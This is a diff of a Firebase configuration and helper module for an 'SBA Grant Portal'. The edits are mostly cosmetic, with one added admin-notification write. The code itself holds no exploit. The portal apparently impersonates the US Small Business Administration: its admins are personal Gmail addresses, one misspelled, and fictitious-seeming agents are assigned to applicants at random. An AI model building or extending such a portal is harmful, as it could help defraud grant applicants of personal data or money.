@@ -1,3 +1,8 @@
+/**
+ * SBA GRANT PORTAL — FIREBASE CONFIGURATION
+ * Version: 10.12.2 (CDN)
+ */
+
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import {
     getAuth, onAuthStateChanged, signOut,
@@ -24,7 +29,7 @@ const firebaseConfig = {
     appId: "1:802243206422:web:bbe74af7ce227092250437"
 };
 
-// Initialize Firebase
+// Initialize
 const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 const db = getFirestore(app);
@@ -33,28 +38,27 @@ let messaging = null;
 try {
     messaging = getMessaging(app);
 } catch (e) {
-    console.warn("Messaging not supported in this environment.");
+    console.warn("FCM not supported in this browser.");
 }
 
-// Set Persistence
+// Persistence
 setPersistence(auth, browserLocalPersistence);
 
-// Admin emails — both auto-get role: "admin"
+// Admin emails
 export const ADMIN_EMAILS = ['sba.suppor@gmail.com', 'liger4683@gmail.com'];
 
-export const AGENTS = [
-    'Sarah Mitchell', 'James Caldwell', 'Diana Torres', 
-    'Robert Hughes', 'Patricia Wells', 'Michael Chen', 
-    'Angela Davis', 'Thomas Brown'
-];
+// Assigned Agents
+export const AGENTS = ['Sarah Mitchell', 'James Caldwell', 'Diana Torres', 'Robert Hughes', 'Patricia Wells', 'Michael Chen', 'Angela Davis', 'Thomas Brown'];
 
-// NOTIFICATION SETUP (REPLACE WITH YOUR KEYS)
-export const EMAILJS_PUBLIC_KEY = 'YOUR_KEY_HERE';  // REPLACE
-export const EMAILJS_SERVICE_ID = 'service_sba';    // REPLACE
-export const EMAILJS_TEMPLATE_ID = 'template_notification'; // REPLACE
-export const FCM_VAPID_KEY = 'BM_YOUR_VAPID_KEY';   // REPLACE
+/**
+ * NOTIFICATION SETUP (REPLACE WITH YOUR KEYS)
+ */
+export const EMAILJS_PUBLIC_KEY = 'YOUR_EMAILJS_PUBLIC_KEY'; // REPLACE WITH YOUR KEY
+export const EMAILJS_SERVICE_ID = 'service_sba';             // REPLACE WITH YOUR KEY
+export const EMAILJS_TEMPLATE_ID = 'template_notification';  // REPLACE WITH YOUR KEY
+export const FCM_VAPID_KEY = 'BM_YOUR_VAPID_KEY';            // REPLACE WITH YOUR KEY
 
-// Logic Helpers
+// Helpers
 export const isAdmin = (email) => ADMIN_EMAILS.includes(email?.toLowerCase());
 export const getRandomAgent = () => AGENTS[Math.floor(Math.random() * AGENTS.length)];
 
@@ -181,6 +185,10 @@ export const notifyAdmins = async ({title, message, type, link}) => {
     snap.forEach(adminDoc => {
         notify(adminDoc.id, {title, message, type, link, sendEmail: false});
     });
+    // Global admin tracking
+    addDoc(collection(db, "notifications"), {
+        uid: 'ADMIN', title, message, type, link: link || '', read: false, createdAt: serverTimestamp()
+    });
 };
 
 export const markNotificationRead = (notifId) => updateDoc(doc(db, "notifications", notifId), { read: true });
@@ -201,7 +209,7 @@ export const requestNotificationPermission = async (uid) => {
             const token = await getToken(messaging, { vapidKey: FCM_VAPID_KEY });
             if (token) await updateUserData(uid, { fcmToken: token, pushNotifications: true });
         }
-    } catch (e) { console.error("FCM Error", e); }
+    } catch (e) { console.error("FCM Token Error", e); }
 };
 
 export const initForegroundMessages = (onReceive) => {
@@ -209,7 +217,10 @@ export const initForegroundMessages = (onReceive) => {
     return onMessage(messaging, (payload) => onReceive(payload));
 };
 
-export const saveRegStep = (data) => sessionStorage.setItem('SBA_REG', JSON.stringify({...getRegData(), ...data}));
+export const saveRegStep = (data) => {
+    const current = JSON.parse(sessionStorage.getItem('SBA_REG') || '{}');
+    sessionStorage.setItem('SBA_REG', JSON.stringify({ ...current, ...data }));
+};
 export const getRegData = () => JSON.parse(sessionStorage.getItem('SBA_REG') || '{}');
 export const clearRegData = () => sessionStorage.removeItem('SBA_REG');
 
@@ -223,9 +234,10 @@ export const sendEmailNotification = ({toEmail, toName, subject, message, action
             message: message,
             action_url: actionUrl
         }, EMAILJS_PUBLIC_KEY);
-    } catch (e) { console.error("EmailJS Error", e); }
+    } catch (e) { console.error("EmailJS Silent Fail", e); }
 };
 
+// Re-exports
 export {
     auth, db, messaging, onAuthStateChanged, signOut,
     createUserWithEmailAndPassword, signInWithEmailAndPassword,
